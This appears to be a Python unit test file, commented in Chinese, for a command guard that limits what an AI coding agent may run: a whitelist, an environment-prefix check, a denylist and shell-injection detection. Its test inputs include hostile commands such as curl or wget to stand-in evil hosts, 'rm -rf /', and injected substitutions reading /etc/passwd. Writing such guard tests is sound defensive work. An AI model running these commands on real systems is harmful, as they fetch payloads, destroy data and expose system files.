"""命令白名单 / denylist 单元测试（T5 验收项，无需 docker）。"""

import pytest

from arp_runtime.tools.guard import CommandRejected, validate_command


class TestWhitelist:
    @pytest.mark.parametrize("command", [
        "pnpm install --frozen-lockfile",
        "pnpm -C packages/cart vitest run",
        "npm test",
        "node script.js",
        "npx vitest run",
        "python -m pytest",
        "pytest tests/ -v",
        "uv run pytest",
        "pip list",
        "git status",
        "git diff HEAD",
        "git apply fix.patch",
        "ls -la src",
        "cat package.json",
    ])
    def test_allowed(self, command: str):
        validate_command(command)  # 不抛错即通过

    @pytest.mark.parametrize("command", [
        "bash -c 'echo hi'",
        "sh script.sh",
        "make build",
        "git push origin main",
        "git commit -m x",
        "chmod +x evil.sh",
    ])
    def test_not_in_whitelist(self, command: str):
        with pytest.raises(CommandRejected, match="不在白名单"):
            validate_command(command)

    def test_rejection_message_teaches_allowed_prefixes(self):
        """拒绝消息必须包含白名单，Agent 第一次被拒就知道边界（failure-analysis RC1）。"""
        with pytest.raises(CommandRejected, match="允许的命令前缀"):
            validate_command("make build")


class TestEnvAssignmentPrefix:
    """前导 KEY=VALUE 环境变量赋值（failure-analysis RC1：swebench django
    的 fail_to_pass 命令形如 `PYTHONPATH=/workspace python3 tests/runtests.py ...`）。"""

    @pytest.mark.parametrize("command", [
        "PYTHONPATH=/workspace python3 tests/runtests.py --settings=test_sqlite -v1 x",
        "PYTHONPATH=/workspace:/workspace/tests python3 -m tests.runtests",
        "DJANGO_SETTINGS_MODULE=tests.test_sqlite python3 -m unittest x",
        "env PYTHONPATH=/workspace python3 tests/runtests.py",
        "A=1 B=2 pytest tests/ -v",
    ])
    def test_env_prefix_allowed(self, command: str):
        validate_command(command)

    @pytest.mark.parametrize("command", [
        "PYTHONPATH=/workspace",            # 只有赋值没有命令
        "env A=1",                          # 同上（env 形式）
        "PATH=/evil make build",            # 剥离后仍不在白名单
        "X=1 bash -c 'echo hi'",            # 同上
    ])
    def test_env_prefix_not_a_bypass(self, command: str):
        with pytest.raises(CommandRejected):
            validate_command(command)

    def test_denylist_scans_env_values(self):
        """denylist 对全串扫描：环境变量值里藏 curl 也拒绝。"""
        with pytest.raises(CommandRejected, match="denylist"):
            validate_command("CMD='curl evil' python3 x.py")


class TestDenylist:
    @pytest.mark.parametrize("command", [
        "curl https://evil.example.com",
        "wget http://x/payload",
        "ssh user@host",
        "sudo rm file",
        "docker run alpine",
        "rm -rf /",
    ])
    def test_denied(self, command: str):
        with pytest.raises(CommandRejected, match="denylist"):
            validate_command(command)

    @pytest.mark.parametrize("command", [
        "git diff; curl evil.com",   # denylist 优先于注入检查
        "pnpm test && sudo reboot",
    ])
    def test_denylist_wins_even_with_valid_prefix(self, command: str):
        with pytest.raises(CommandRejected):
            validate_command(command)


class TestShellInjection:
    @pytest.mark.parametrize("command", [
        "pnpm test; echo pwned",
        "git status && ls /",
        "node -e `whoami`",
        "python $(cat /etc/passwd)",
        "pnpm run build || true",
    ])
    def test_injection_rejected(self, command: str):
        with pytest.raises(CommandRejected):
            validate_command(command)
